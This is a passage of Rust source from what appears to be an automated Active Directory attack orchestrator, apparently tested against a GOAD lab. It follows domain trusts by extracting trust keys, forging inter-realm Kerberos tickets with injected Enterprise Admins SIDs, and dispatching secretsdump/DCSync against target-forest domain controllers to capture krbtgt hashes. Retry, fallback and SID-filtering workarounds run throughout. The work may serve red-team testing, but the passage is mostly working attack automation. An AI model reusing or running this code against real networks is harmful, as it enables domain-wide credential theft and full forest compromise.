                        .throttled_submit("credential_access", "credential_access", payload, 7)
                        .await
                    {
                        Ok(Some(task_id)) => {
                            info!(
                                task_id = %task_id,
                                trust_account = %trust_account,
                                trust_domain = %trust_domain,
                                source_domain = %source_domain,
                                auth = if admin_cred.is_some() { "password" } else { "hash" },
                                "Trust key extraction dispatched"
                            );
                            dispatcher
                                .state
                                .write()
                                .await
                                .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
                            let _ = dispatcher
                                .state
                                .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
                                .await;
                        }
                        Ok(None) => {}
                        Err(e) => {
                            warn!(err = %e, "Failed to dispatch trust key extraction")
                        }
                    }
                }
            }
        }

        // Follow trust keys (inter-realm ticket + foreign secretsdump)
        //
        // The deterministic forge uses only the trust key + SIDs (already on
        // each TrustFollowWork item) — no admin cred required.
        let work: Vec<TrustFollowWork> = {
            let state = dispatcher.state.read().await;

            // Skip if no domain admin yet — trust extraction requires DA-level creds
            if !state.has_domain_admin {
                continue;
            }

            // Build lookup of known trust flat names → TrustInfo so we only
            // process actual trust account hashes, not random machine accounts.
            let trust_by_flat: std::collections::HashMap<String, &ares_core::models::TrustInfo> =
                state
                    .trusted_domains
                    .values()
                    .map(|t| (t.flat_name.to_uppercase(), t))
                    .collect();

            // Iterate current keys before history keys. NTDS exposes both
            // current and `_history0`/`_prev` rows for trust accounts; the
            // dedup key `(source, username)` collapses them, so whichever
            // wins the dedup race gets the dispatch. Sorting current-first
            // ensures we forge with the up-to-date trust key by default and
            // only fall back to a history key if the current one's dedup
            // already cleared (operator retry path).
            let mut hashes_sorted: Vec<&ares_core::models::Hash> = state.hashes.iter().collect();
            hashes_sorted.sort_by_key(|h| h.is_previous as u8);

            let items = hashes_sorted
                .into_iter()
                .filter_map(|hash| {
                    if !hash.username.ends_with('$') {
                        return None;
                    }

                    let netbios = hash.username.trim_end_matches('$').to_uppercase();

                    // Resolve source domain — fall back to first dominated domain
                    // with a DC when secretsdump output lacks domain prefix
                    let source_domain_raw = if hash.domain.is_empty() {
                        state
                            .domain_controllers
                            .keys()
                            .find(|d| state.dominated_domains.contains(&d.to_lowercase()))
                            .cloned()
                            .unwrap_or_default()
                    } else {
                        hash.domain.clone()
                    };
                    if source_domain_raw.is_empty() {
                        return None;
                    }
                    // Canonicalize: secretsdump can emit `hash.domain="NORTH"`
                    // (NetBIOS flat) when the parent suffix isn't visible to the
                    // parser. Downstream lookups against `domain_sids` /
                    // `domain_controllers` are FQDN-keyed, so the flat label
                    // misses every cache and the cross-forest forge defers
                    // forever. Skip the item when the label can't be resolved
                    // to a known FQDN rather than guessing.
                    let source_domain = canonicalize_domain_label(&source_domain_raw, &state)?;
                    let source_lower = source_domain.to_lowercase();

                    // Resolve target FQDN in three tiers:
                    //   1. Explicit TrustInfo from prior LDAP trust enum.
                    //   2. Known-FQDN tier — `domain_controllers` /
                    //      `dominated_domains` where the first DNS label
                    //      matches. Requires prior DC enum on the target.
                    //   3. Corroborated-signal tier — candidate FQDN appears
                    //      in state via a Host hostname suffix, a Credential
                    //      row, or a discovered-vuln details["domain"], AND
                    //      its first DNS label matches `netbios`. This lets
                    //      a captured trust key act on a target whose DC we
                    //      haven't enumerated yet, without resorting to a
                    //      blind FQDN guess.
                    let target_domain = if let Some(t) = trust_by_flat.get(&netbios) {
                        t.domain.clone()
                    } else if let Some(d) = state
                        .domain_controllers
                        .keys()
                        .chain(state.dominated_domains.iter())
                        .find(|d| {
                            let dl = d.to_lowercase();
                            dl != source_lower
                                && d.split('.')
                                    .next()
                                    .map(|label| label.to_uppercase() == netbios)
                                    .unwrap_or(false)
                        })
                        .cloned()
                    {
                        d
                    } else {
                        resolve_target_fqdn_from_signals(&state, &netbios, &source_lower)?
                    };

                    let dedup_key = format!(
                        "trust_follow:{}:{}",
                        source_lower,
                        hash.username.to_lowercase()
                    );
                    if state.is_processed(DEDUP_TRUST_FOLLOW, &dedup_key) {
                        return None;
                    }

                    // Use resolve_dc_ip so we fall back to the hosts table when
                    // domain_controllers lacks an explicit entry for the foreign
                    // domain — common for cross-forest trusts where the foreign
                    // DC is only known via host scan, not LDAP enumeration.
                    let target_dc_ip = state.resolve_dc_ip(&target_domain);

                    let source_domain_sid = state
                        .domain_sids
                        .get(&source_domain.to_lowercase())
                        .cloned();
                    let target_domain_sid = state
                        .domain_sids
                        .get(&target_domain.to_lowercase())
                        .cloned();

                    Some(TrustFollowWork {
                        dedup_key,
                        hash: hash.clone(),
                        source_domain,
                        target_domain,
                        target_dc_ip,
                        source_domain_sid,
                        target_domain_sid,
                    })
                })
                .collect();

            items
        };

        // Vuln-driven fallback: rebuild work items directly from
        // `discovered_vulnerabilities`. The hash-iteration above can silently
        // drop a valid forest_trust_escalation when one of its FQDN heuristics
        // fails — the analyzer that produced the vuln has the resolved
        // target_dc_ip on hand, so this path closes the gap.
        let work: Vec<TrustFollowWork> = {
            let state = dispatcher.state.read().await;
            let vuln_items = collect_trust_follow_work_from_vulns(&state);
            drop(state);

            let hash_keys: HashSet<String> = work.iter().map(|w| w.dedup_key.clone()).collect();
            for vi in &vuln_items {
                if !hash_keys.contains(&vi.dedup_key) {
                    info!(
                        source = %vi.source_domain,
                        target = %vi.target_domain,
                        trust_account = %vi.hash.username,
                        target_dc_ip = ?vi.target_dc_ip,
                        "auto_trust_follow: vuln-driven fallback added forest_trust_escalation work item missed by hash iteration"
                    );
                }
            }

            // Vuln-driven items first so a duplicate dedup_key wins with the
            // analyzer's resolved target_dc_ip rather than the hash path's
            // possibly-None one.
            let mut seen = HashSet::new();
            vuln_items
                .into_iter()
                .chain(work)
                .filter(|w| seen.insert(w.dedup_key.clone()))
                .collect()
        };

        for item in work {
            // Defer dispatch when the target DC IP is unknown: impacket needs
            // a routable -target-ip for both create_inter_realm_ticket and the
            // forge-and-present secretsdump fallback. Passing the bare domain
            // string fails fast and burns the dedup key. Re-tick in 30s and
            // let host scans / trust enum populate the DC entry first.
            let Some(target_dc_ip) = item.target_dc_ip.clone() else {
                debug!(
                    source = %item.source_domain,
                    target = %item.target_domain,
                    trust_account = %item.hash.username,
                    "Deferring forest trust escalation — target DC IP unresolved"
                );
                continue;
            };
            let vuln = build_trust_escalation_vuln(
                &item.source_domain,
                &item.target_domain,
                &item.hash.username,
                &target_dc_ip,
            );
            let vuln_id = vuln.vuln_id.clone();
            {
                let _ = dispatcher
                    .state
                    .publish_vulnerability(&dispatcher.queue, vuln)
                    .await;
            }

            // Skip self-referential trust (source == target)
            if item.source_domain.to_lowercase() == item.target_domain.to_lowercase() {
                debug!(
                    source = %item.source_domain,
                    target = %item.target_domain,
                    "Skipping self-referential trust escalation"
                );
                continue;
            }

            // Suppress the ExtraSid forge when the trust has SID filtering
            // active. ticketer adds Enterprise Admins (RID 519) via
            // `--extra-sid` to satisfy DCSync — but a SID-filtered forest
            // trust strips the injected SID from the cross-realm PAC, and the
            // target KDC returns rpc_s_access_denied. Burn the dedup so this
            // doomed dispatch can't loop, then wake the cross-forest fallback
            // paths (ACL/MSSQL/FSP) to take over. The vuln is left unexploited
            // — only a target krbtgt capture proves compromise.
            {
                let state = dispatcher.state.read().await;
                if is_filtered_inter_forest_trust(&state, &item.source_domain, &item.target_domain)
                {
                    info!(
                        source = %item.source_domain,
                        target = %item.target_domain,
                        trust_account = %item.hash.username,
                        "Suppressing forge_inter_realm_and_dump — SID filtering on cross-forest trust would reject ExtraSid; waking fallbacks"
                    );
                    drop(state);
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_TRUST_FOLLOW, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &item.dedup_key)
                        .await;
                    wake_cross_forest_fallbacks(&dispatcher, &item.target_domain).await;

                    // Dispatch `create_inter_realm_ticket` so downstream Kerberos-capable
                    // tools (e.g. bloodyad with -k) have a valid ccache for the target
                    // forest. SID filtering blocks ExtraSid-based DCSync, but the forged
                    // TGT still allows Kerberos LDAP bind as Administrator. The tool writes
                    // Administrator.ccache in a tempdir; we persist the full path to Redis
                    // via `publish_kerberos_ticket` so the credential resolver can find it.
                    {
                        let dispatcher_bg = dispatcher.clone();
                        let source_domain_bg = item.source_domain.clone();
                        let target_domain_bg = item.target_domain.clone();
                        let trust_key_bg = item.hash.hash_value.clone();
                        let aes_key_bg = item.hash.aes_key.clone();
                        let source_domain_sid_bg = {
                            let s = dispatcher.state.read().await;
                            s.domain_sids
                                .get(&item.source_domain.to_lowercase())
                                .cloned()
                        };
                        tokio::spawn(async move {
                            dispatch_create_inter_realm_ticket(
                                &dispatcher_bg,
                                &source_domain_bg,
                                &target_domain_bg,
                                &trust_key_bg,
                                aes_key_bg.as_deref(),
                                source_domain_sid_bg.as_deref(),
                            )
                            .await;
                        });
                    }
                    continue;
                }
            }

            // Forge-and-present the inter-realm TGT as a deterministic worker
            // task — NOT an LLM task. Both `create_inter_realm_ticket` and
            // `secretsdump_kerberos` run sequentially on the same worker via
            // `expand_technique_task`, so the ccache file produced by ticketer
            // is on the same filesystem when secretsdump reads it.
            //
            // Routing through the LLM here would launder deterministic values
            // (NT hash, AES key, SIDs) through token generation — the LLM
            // would have to copy them out of the rendered prompt into tool
            // call args, where they get dropped, typo'd, or omitted. The
            // orchestrator already owns every input; deliver them directly.
            //
            // Resolve the target DC hostname so Kerberos auth can match the
            // SPN baked into the ticket. Reject zone-apex A records where
            // `hostname == target_domain`: the KDC has no `cifs/<bare-domain>`
            // SPN registered, so the forged TGS request returns
            // KDC_ERR_S_PRINCIPAL_UNKNOWN. A real DC FQDN carries a leading
            // label (e.g. `dc01.contoso.local`). Falls back to the IP as a
            // last resort.
            let target_dc_hostname = {
                let s = dispatcher.state.read().await;
                resolve_target_dc_hostname(&s.hosts, &target_dc_ip, &item.target_domain)
            };

            // ticketer writes <username>.ccache in the worker cwd; the
            // following secretsdump_kerberos call reads it via KRB5CCNAME.
            let ticket_username = "Administrator";
            let ticket_path = format!("{ticket_username}.ccache");

            // Resolve missing source SID via lookupsid against the source
            // DC. ticketer.py needs `--domain-sid` for the source realm to
            // build a valid PAC; without it the resulting ticket gets
            // rejected by the target KDC. We have DA on the source domain
            // (cross-forest forge only fires after DA), so SAMR lookupsid
            // works with either a password cred or admin NTLM hash.
            let source_domain_sid = if item.source_domain_sid.is_some() {
                item.source_domain_sid.clone()
            } else {
                let (source_dc_ip, src_cred, src_hash) = {
                    let s = dispatcher.state.read().await;
                    let src_lower = item.source_domain.to_lowercase();
                    let dc = s.resolve_dc_ip(&item.source_domain);
                    let cred = s
                        .credentials
                        .iter()
                        .find(|c| {
                            c.is_admin
                                && !c.password.is_empty()
                                && c.domain.to_lowercase() == src_lower
                        })
                        .cloned();
                    let h = s
                        .hashes
                        .iter()
                        .find(|h| {
                            h.username.to_lowercase() == "administrator"
                                && h.domain.to_lowercase() == src_lower
                                && h.hash_type.to_uppercase() == "NTLM"
                        })
                        .cloned();
                    (dc, cred, h)
                };
                let resolved = if let Some(ref dc_ip) = source_dc_ip {
                    super::golden_ticket::resolve_domain_sid(
                        &item.source_domain,
                        dc_ip,
                        src_cred.as_ref(),
                        src_hash.as_ref(),
                    )
                    .await
                } else {
                    None
                };
                if let Some((sid, admin_name)) = resolved {
                    info!(
                        source_domain = %item.source_domain,
                        sid = %sid,
                        "Resolved source domain SID for cross-forest forge"
                    );
                    let op_id = { dispatcher.state.read().await.operation_id.clone() };
                    let reader = ares_core::state::RedisStateReader::new(op_id);
                    let mut conn = dispatcher.queue.connection();
                    let src_lower = item.source_domain.to_lowercase();
                    let _ = reader.set_domain_sid(&mut conn, &src_lower, &sid).await;
                    if let Some(ref name) = admin_name {
                        let _ = reader.set_admin_name(&mut conn, &src_lower, name).await;
                    }
                    {
                        let mut state = dispatcher.state.write().await;
                        state.domain_sids.insert(src_lower.clone(), sid.clone());
                        if let Some(ref name) = admin_name {
                            state.admin_names.insert(src_lower, name.clone());
                        }
                    }
                    Some(sid)
                } else {
                    warn!(
                        source = %item.source_domain,
                        target = %item.target_domain,
                        "Could not resolve source SID — deferring cross-forest forge"
                    );
                    None
                }
            };
            if source_domain_sid.is_none() {
                continue;
            }

            // For child→parent forges we MUST inject the parent's Enterprise
            // Admins SID (RID 519) as ExtraSid; without it the parent KDC
            // issues a TGS but DRSUAPI on the parent DC rejects the
            // replication call as `rpc_s_access_denied` and nxc dumps zero
            // hashes (exit 0, hiding the failure). For child→parent the SID
            // resolution is a hard precondition — defer dispatch when it
            // fails so the next 30s tick can retry.
            //
            // For cross-forest forges, the target domain SID is NOT required
            // by `forge_inter_realm_and_dump` — the tool reads `target_sid`
            // into a discarded `_target_sid` (see ares-tools/src/privesc/
            // trust.rs: "currently unused by ticketer; accepted for API
            // parity"). Gating cross-forest dispatch on a SAMR lookupsid
            // call against the target DC was a phantom requirement that
            // also tends to fail (we have no target-realm creds yet —
            // that's the whole point of the forge), parking the work
            // indefinitely on the deferred queue. Cross-forest now passes
            // the cached SID through if known but never blocks on it.
            let source_l = item.source_domain.to_lowercase();
            let target_l = item.target_domain.to_lowercase();
            let is_child_to_parent =
                source_l != target_l && source_l.ends_with(&format!(".{target_l}"));
            let is_cross_domain = source_l != target_l;
            // Manual SSM validation against GOAD-staging proved that injecting
            // foreign-realm SIDs (RID 519 EA, RID 1117/1118 custom groups, even
            // a direct user RID 1121 listed in BUILTIN\Administrators) all get
            // stripped by the receiving DC's SID filter regardless of RID > 1000.
            // Cross-forest forge with ExtraSid is not load-bearing in this lab.
            // Keep emission scoped to intra-forest child→parent until we have a
            // working cross-forest primitive validated end-to-end.
            let needs_target_sid = is_child_to_parent;
            let target_domain_sid: Option<String> =
                if !needs_target_sid || item.target_domain_sid.is_some() {
                    item.target_domain_sid.clone()
                } else {
                    let (src_cred, src_hash) = {
                        let s = dispatcher.state.read().await;
                        let src_lower = item.source_domain.to_lowercase();
                        let cred = s
                            .credentials
                            .iter()
                            .find(|c| {
                                c.is_admin
                                    && !c.password.is_empty()
                                    && c.domain.to_lowercase() == src_lower
                            })
                            .cloned();
                        let h = s
                            .hashes
                            .iter()
                            .find(|h| {
                                h.username.to_lowercase() == "administrator"
                                    && h.domain.to_lowercase() == src_lower
                                    && h.hash_type.to_uppercase() == "NTLM"
                            })
                            .cloned();
                        (cred, h)
                    };
                    let resolved = super::golden_ticket::resolve_domain_sid(
                        &item.target_domain,
                        &target_dc_ip,
                        src_cred.as_ref(),
                        src_hash.as_ref(),
                    )
                    .await;
                    if let Some((sid, admin_name)) = resolved {
                        info!(
                            target_domain = %item.target_domain,
                            sid = %sid,
                            "Resolved parent domain SID for child→parent forge ExtraSid"
                        );
                        let op_id = { dispatcher.state.read().await.operation_id.clone() };
                        let reader = ares_core::state::RedisStateReader::new(op_id);
                        let mut conn = dispatcher.queue.connection();
                        let tgt_lower = item.target_domain.to_lowercase();
                        let _ = reader.set_domain_sid(&mut conn, &tgt_lower, &sid).await;
                        if let Some(ref name) = admin_name {
                            let _ = reader.set_admin_name(&mut conn, &tgt_lower, name).await;
                        }
                        {
                            let mut state = dispatcher.state.write().await;
                            state.domain_sids.insert(tgt_lower.clone(), sid.clone());
                            if let Some(ref name) = admin_name {
                                state.admin_names.insert(tgt_lower, name.clone());
                            }
                        }
                        Some(sid)
                    } else {
                        warn!(
                            source = %item.source_domain,
                            target = %item.target_domain,
                            target_dc_ip = %target_dc_ip,
                            "Could not resolve parent SID — deferring child→parent forge"
                        );
                        None
                    }
                };
            if needs_target_sid && target_domain_sid.is_none() {
                continue;
            }

            // Wait for AES256 to upsert before dispatching cross-forest forge.
            // secretsdump runs twice (NTLM-only first, then -aes-types) and the
            // second call typically lands ~60-90s after NTLM. If we dispatch
            // before AES arrives, Win2016+ targets reject the RC4-only ticket
            // with KDC_ERR_TGT_REVOKED and forge_inter_realm yields zero hashes
            // — locking dedup on a doomed dispatch.
            //
            // Re-read state.hashes for an AES-equipped variant of this trust
            // account; if present, use it. If absent, defer up to ~3 min so the
            // second secretsdump can land. After that, dispatch with NTLM-only
            // as a last resort (some target DCs accept RC4 still, and the
            // wake_cross_forest_fallbacks path is the real safety net).
            let resolved_aes_key: Option<String> = if is_cross_domain {
                let from_state = {
                    let s = dispatcher.state.read().await;
                    s.hashes
                        .iter()
                        .find(|h| {
                            h.username.eq_ignore_ascii_case(&item.hash.username)
                                && h.domain.eq_ignore_ascii_case(&item.hash.domain)
                                && h.aes_key.is_some()
                        })
                        .and_then(|h| h.aes_key.clone())
                };
                let aes = item.hash.aes_key.clone().or(from_state);
                if aes.is_none() {
                    let attempts = {
                        let mut state = dispatcher.state.write().await;
                        let count = state
                            .forge_aes_defers
                            .entry(item.dedup_key.clone())
                            .or_insert(0);
                        *count += 1;
                        *count
                    };
                    const MAX_AES_DEFERS: u32 = 6;
                    if attempts <= MAX_AES_DEFERS {
                        debug!(
                            source = %item.source_domain,
                            target = %item.target_domain,
                            trust_account = %item.hash.username,
                            attempts,
                            "Deferring cross-forest forge — AES256 not yet upserted on trust hash"
                        );
                        continue;
                    }
                    warn!(
                        source = %item.source_domain,
                        target = %item.target_domain,
                        trust_account = %item.hash.username,
                        "Dispatching cross-forest forge with NTLM-only after AES wait exhausted"
                    );
                    None
                } else {
                    aes
                }
            } else {
                item.hash.aes_key.clone()
            };

            // Build args for the combined `forge_inter_realm_and_dump` tool.
            // This single tool runs impacket-ticketer + impacket-secretsdump
            // sequentially in one worker invocation (shared tempdir as cwd),
            // so the .ccache produced by ticketer is on the same filesystem
            // when secretsdump reads it. Two split dispatch_tool calls would
            // land on different worker pods with no shared FS.
            let mut tool_args = json!({
                "source_domain": &item.source_domain,
                "target_domain": &item.target_domain,
                "trust_key": &item.hash.hash_value,
                "username": ticket_username,
                // `target` is the DC hostname (or IP fallback) for the SPN
                // baked into the ticket; `dc_ip` is the routable IP used
                // for impacket-secretsdump's `-dc-ip`.
                "target": &target_dc_hostname,
                "dc_ip": &target_dc_ip,
            });
            if let Some(ref sid) = source_domain_sid {
                tool_args["source_sid"] = json!(sid);
            }
            if let Some(ref sid) = target_domain_sid {
                tool_args["target_sid"] = json!(sid);
            }
            // AES256 trust key — required for Win2016+ target DCs which
            // reject RC4-only inter-realm tickets with KDC_ERR_TGT_REVOKED.
            // resolved_aes_key prefers item.hash.aes_key, then re-reads
            // state.hashes for an AES-equipped variant (handles the race
            // where secretsdump's second pass upserts AES after work was
            // collected).
            if let Some(ref aes) = resolved_aes_key {
                tool_args["aes_key"] = json!(aes);
            }
            // For child→parent trusts (intra-forest), inject parent's
            // Enterprise Admins SID (RID 519). Scope is intra-forest only:
            // cross-forest receiving DCs strip every foreign SID
            // (including RID > 1000) via SID filtering.
            if is_child_to_parent {
                if let Some(ref tsid) = target_domain_sid {
                    tool_args["extra_sid"] = json!(format!("{tsid}-519"));
                }
            }
            let _ = ticket_path; // ccache path is internal to the tool

            let call = ToolCall {
                id: format!("forge_inter_realm_{}", uuid::Uuid::new_v4().simple()),
                name: "forge_inter_realm_and_dump".to_string(),
                arguments: tool_args,
            };
            let task_id = format!(
                "trust_forge_{}",
                &uuid::Uuid::new_v4().simple().to_string()[..12]
            );

            // Mark dedup BEFORE spawning so the next 30s tick doesn't
            // re-dispatch the same trust while the forge is running. Also
            // record the mark timestamp in `forge_in_flight` so the staleness
            // sweep at the top of each tick can recover from the case where
            // the spawn never actually runs the tool.
            {
                let mut state = dispatcher.state.write().await;
                state.mark_processed(DEDUP_TRUST_FOLLOW, item.dedup_key.clone());
                state
                    .forge_in_flight
                    .insert(item.dedup_key.clone(), Instant::now());
            }
            let _ = dispatcher
                .state
                .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &item.dedup_key)
                .await;

            info!(
                convergence_stage = 4,
                event = "forge_inter_realm_and_dump_dispatched",
                task_id = %task_id,
                trust_account = %item.hash.username,
                source_domain = %item.source_domain,
                target_domain = %item.target_domain,
                has_source_sid = source_domain_sid.is_some(),
                has_target_sid = target_domain_sid.is_some(),
                has_aes = resolved_aes_key.is_some(),
                "convergence: forge_inter_realm_and_dump dispatched (ticketer + secretsdump against target-realm DC, direct tool, no LLM)"
            );

            let dispatcher_bg = dispatcher.clone();
            let source_domain_bg = item.source_domain.clone();
            let target_domain_bg = item.target_domain.clone();
            let trust_account_bg = item.hash.username.clone();
            let vuln_id_bg = vuln_id.clone();
            let dedup_key_bg = item.dedup_key.clone();
            let trust_key_bg = item.hash.hash_value.clone();
            let aes_key_bg = resolved_aes_key.clone();
            let source_domain_sid_bg = source_domain_sid.clone();
            let is_child_to_parent_bg = is_child_to_parent;
            tokio::spawn(async move {
                let result = dispatcher_bg
                    .llm_runner
                    .tool_dispatcher()
                    .dispatch_tool("privesc", &task_id, &call)
                    .await;
                // Clear dedup on failure so the next 30s tick can retry once
                // a fresh trust key, AES key, or SID becomes available. Also
                // drop the `forge_in_flight` heartbeat so the staleness sweep
                // doesn't double-clear after we've already cleared.
                let clear_dedup = || async {
                    {
                        let mut state = dispatcher_bg.state.write().await;
                        state.forge_in_flight.remove(&dedup_key_bg);
                        state.unmark_processed(DEDUP_TRUST_FOLLOW, &dedup_key_bg);
                    }
                    let _ = dispatcher_bg
                        .state
                        .unpersist_dedup(&dispatcher_bg.queue, DEDUP_TRUST_FOLLOW, &dedup_key_bg)
                        .await;
                };
                match result {
                    Ok(exec_result) => {
                        if let Some(err) = exec_result.error.as_ref() {
                            let raw_tail: String = exec_result
                                .output
                                .chars()
                                .rev()
                                .take(2000)
                                .collect::<String>()
                                .chars()
                                .rev()
                                .collect();
                            let tail = ares_tools::redact::redact_text(&raw_tail);
                            // Deterministic-failure signatures that will NOT
                            // heal on the next 30s tick — the target DC's
                            // Kerberos database won't sprout a `cifs/<apex>`
                            // SPN, and impacket won't grow support for a
                            // malformed target on retry. Keep dedup marked so
                            // the wrapper doesn't hot-loop (we've seen 363
                            // retries in ~50 min from this exact signature).
                            //
                            // KDC_ERR_WRONG_REALM belongs here too: it means
                            // we asked this KDC for a principal in a realm it
                            // does not serve, which is a wrong-target SPN by
                            // another name. Retrying re-sends the identical
                            // request; only new recon state can change the
                            // answer. Left unlocked it cost 131 retries in 65
                            // min against a child DC picked for a parent forge.
                            let wrong_target_spn = tail.contains("KDC_ERR_S_PRINCIPAL_UNKNOWN")
                                || tail.contains("KDC_ERR_WRONG_REALM");
                            if wrong_target_spn {
                                warn!(
                                    err = %err,
                                    source_domain = %source_domain_bg,
                                    target_domain = %target_domain_bg,
                                    trust_account = %trust_account_bg,
                                    output_tail = %tail,
                                    "forge_inter_realm_and_dump: wrong-target SPN (KDC_ERR_S_PRINCIPAL_UNKNOWN / KDC_ERR_WRONG_REALM) — apex, malformed, or wrong-realm target; locking dedup (recon must persist a real DC FQDN in the target domain before retry can succeed)"
                                );
                                {
                                    let mut state = dispatcher_bg.state.write().await;
                                    state.forge_in_flight.remove(&dedup_key_bg);
                                }
                                return;
                            }
                            warn!(
                                err = %err,
                                source_domain = %source_domain_bg,
                                target_domain = %target_domain_bg,
                                trust_account = %trust_account_bg,
                                output_tail = %tail,
                                "forge_inter_realm_and_dump returned error — clearing dedup for retry"
                            );
                            clear_dedup().await;
                            return;
                        }
                        // Verify target compromise — only mark exploited
                        // when we actually observe the target krbtgt hash
                        // in the dispatch_tool discoveries.
                        let target_lower = target_domain_bg.to_lowercase();
                        let has_target_krbtgt = exec_result
                            .discoveries
                            .as_ref()
                            .and_then(|d| d.get("hashes"))
                            .and_then(|h| h.as_array())
                            .map(|hashes| {
                                hashes.iter().any(|h| {
                                    let user =
                                        h.get("username").and_then(|v| v.as_str()).unwrap_or("");
                                    let dom =
                                        h.get("domain").and_then(|v| v.as_str()).unwrap_or("");
                                    let htype =
                                        h.get("hash_type").and_then(|v| v.as_str()).unwrap_or("");
                                    user.eq_ignore_ascii_case("krbtgt")
                                        && dom.to_lowercase() == target_lower
                                        && htype.eq_ignore_ascii_case("ntlm")
                                })
                            })
                            .unwrap_or(false);
                        if has_target_krbtgt {
                            info!(
                                source_domain = %source_domain_bg,
                                target_domain = %target_domain_bg,
                                child_to_parent = is_child_to_parent_bg,
                                "Trust forge compromised target — marking exploited"
                            );
                            let _ = dispatcher_bg
                                .state
                                .mark_exploited(&dispatcher_bg.queue, &vuln_id_bg)
                                .await;
                            let (description, techniques) = trust_escalation_event_fields(
                                &source_domain_bg,
                                &target_domain_bg,
                                &trust_account_bg,
                            );
                            let event_id = format!(
                                "evt-trust-{}",
                                &uuid::Uuid::new_v4().simple().to_string()[..8]
                            );
                            let event = serde_json::json!({
                                "id": event_id,
                                "timestamp": chrono::Utc::now().to_rfc3339(),
                                "source": "trust_automation",
                                "description": description,
                                "mitre_techniques": techniques,
                            });
                            let _ = dispatcher_bg
                                .state
                                .persist_timeline_event(&dispatcher_bg.queue, &event, &techniques)
                                .await;
                        } else {
                            // Tool ran cleanly but no target krbtgt landed in
                            // discoveries — this is a deterministic failure
                            // (SID filtering, denied permissions, or wrong
                            // forest) that won't change on the next 30s tick.
                            // Keep dedup MARKED so we don't relitigate the
                            // doomed forge in a tight loop, leave the trust
                            // vuln UNexploited (only a target krbtgt capture
                            // proves compromise), and wake the cross-forest
                            // fallback paths (ACL/MSSQL/FSP) which can still
                            // compromise the target forest without ExtraSid.
                            //
                            // Surface tool stdout tail + a hash-count summary so
                            // post-mortem can distinguish silent nxc failure
                            // (empty output) from auth-denied (nxc printed
                            // STATUS_LOGON_FAILURE / rpc_s_access_denied) from
                            // partial dumps (got hashes but no krbtgt — usually
                            // a cross-forest no-ExtraSid case where the target
                            // KDC issued a TGS but DRSUAPI rejected replication).
                            let raw_tail: String = exec_result
                                .output
                                .chars()
                                .rev()
                                .take(2000)
                                .collect::<String>()
                                .chars()
                                .rev()
                                .collect();
                            let tail = ares_tools::redact::redact_text(&raw_tail);
                            let hash_count = exec_result
                                .discoveries
                                .as_ref()
                                .and_then(|d| d.get("hashes"))
                                .and_then(|h| h.as_array())
                                .map(|a| a.len())
                                .unwrap_or(0);

                            // Recoverable case: this forge fired NTLM-only
                            // (`aes_key_bg` is None — the AES256 trust key hadn't
                            // upserted when the AES wait expired) and the dump
                            // came back empty. Against a cross-forest target that
                            // is almost always the RC4/etype rejection an AES-only
                            // forest returns (KDC_ERR_ETYPE_NOSUPP), NOT SID
                            // filtering — locking dedup here strands the pivot
                            // even after the trust-key extraction lands AES.
                            // Instead clear dedup and reset the AES wait so a
                            // later tick re-forges WITH -aesKey once AES is in
                            // state. Bounded by `forge_ntlm_fallback_attempts`
                            // (each retry is gated behind a fresh ~3 min AES wait,
                            // so this is not a hot-loop) so a target where AES
                            // genuinely never arrives eventually locks.
                            if aes_key_bg.is_none() {
                                const MAX_NTLM_FORGE_ATTEMPTS: u32 = 3;
                                let attempts = {
                                    let mut state = dispatcher_bg.state.write().await;
                                    let c = state
                                        .forge_ntlm_fallback_attempts
                                        .entry(dedup_key_bg.clone())
                                        .or_insert(0);
                                    *c += 1;
                                    *c
                                };
                                if attempts <= MAX_NTLM_FORGE_ATTEMPTS {
                                    warn!(
                                        source_domain = %source_domain_bg,
                                        target_domain = %target_domain_bg,
                                        attempts,
                                        "NTLM-only cross-forest forge returned zero hashes (likely AES-only target rejecting the RC4 inter-realm ticket) — clearing dedup and resetting the AES wait to re-forge once the AES256 trust key lands"
                                    );
                                    {
                                        let mut state = dispatcher_bg.state.write().await;
                                        state.forge_aes_defers.remove(&dedup_key_bg);
                                    }
                                    clear_dedup().await;
                                    return;
                                }
                            }

                            warn!(
                                source_domain = %source_domain_bg,
                                target_domain = %target_domain_bg,
                                hash_count,
                                output_tail = %tail,
                                "forge_inter_realm_and_dump completed but no target krbtgt observed — locking dedup, waking fallbacks (vuln NOT marked exploited; only target krbtgt capture proves compromise)"
                            );
                            let _ = vuln_id_bg; // intentionally unused — see comment above

                            // Dump-phase failure (SID filtering missed by
                            // is_filtered_inter_forest_trust, DRSUAPI denial
                            // despite a valid TGS, or any other reason DCSync
                            // returned 0 hashes) leaves the foreign forest
                            // attackable via Kerberos LDAP bind. Dispatch
                            // create_inter_realm_ticket so downstream tools
                            // (bloodyad -k, etc.) get a usable ccache.
                            // Without this, wake_cross_forest_fallbacks below
                            // is a no-op when no same-realm credential binds
                            // the ACL/foreign-group/cross-forest enums to the
                            // target.
                            {
                                let dispatcher_fb = dispatcher_bg.clone();
                                let source_domain_fb = source_domain_bg.clone();
                                let target_domain_fb = target_domain_bg.clone();
                                let trust_key_fb = trust_key_bg.clone();
                                let aes_key_fb = aes_key_bg.clone();
                                let source_domain_sid_fb = source_domain_sid_bg.clone();
                                tokio::spawn(async move {
                                    dispatch_create_inter_realm_ticket(
                                        &dispatcher_fb,
                                        &source_domain_fb,
                                        &target_domain_fb,
                                        &trust_key_fb,
                                        aes_key_fb.as_deref(),
                                        source_domain_sid_fb.as_deref(),
                                    )
                                    .await;
                                });
                            }

                            wake_cross_forest_fallbacks(&dispatcher_bg, &target_domain_bg).await;
                        }
                    }
                    Err(e) => {
                        warn!(
                            err = %e,
                            source_domain = %source_domain_bg,
                            target_domain = %target_domain_bg,
                            "forge_inter_realm_and_dump dispatch errored — clearing dedup for retry"
                        );
                        clear_dedup().await;
                    }
                }
                // Spawn body finished (any branch). Drop the heartbeat so the
                // staleness sweep doesn't later "recover" a dispatch that
                // already completed normally — `clear_dedup` covers the Err
                // arm but the Ok arms (krbtgt found vs not) intentionally
                // keep dedup MARKED and need this cleanup explicitly.
                dispatcher_bg
                    .state
                    .write()
                    .await
                    .forge_in_flight
                    .remove(&dedup_key_bg);
            });
        }
    }
}

struct TrustFollowWork {
    dedup_key: String,
    hash: ares_core::models::Hash,
    source_domain: String,
